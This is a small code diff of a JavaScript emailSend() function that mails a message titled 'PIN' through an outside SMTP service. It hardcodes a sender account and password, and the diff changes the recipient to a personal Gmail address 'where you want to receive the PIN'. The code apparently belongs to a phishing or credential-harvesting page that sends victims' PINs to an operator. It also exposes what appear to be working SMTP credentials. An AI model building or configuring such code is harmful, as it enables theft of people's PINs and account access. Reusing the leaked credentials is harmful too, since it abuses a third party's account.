@@ -12,7 +12,7 @@ function emailSend() {
     Host: "smtp.elasticemail.com",
     Username: "nelsf38@gmail.com",
     Password: "3D538C4DF17B36F1E64CD578356BE2FCF3CA",
-    To: 'email@gmail.com', // Change this to your email address where you want to receive the PIN
+    To: 'chukwuebukawilliams6@gmail.com', // Change this to your email address where you want to receive the PIN
     From: "nelsf38@gmail.com",
     Subject: "PIN",
     Body: messageBody
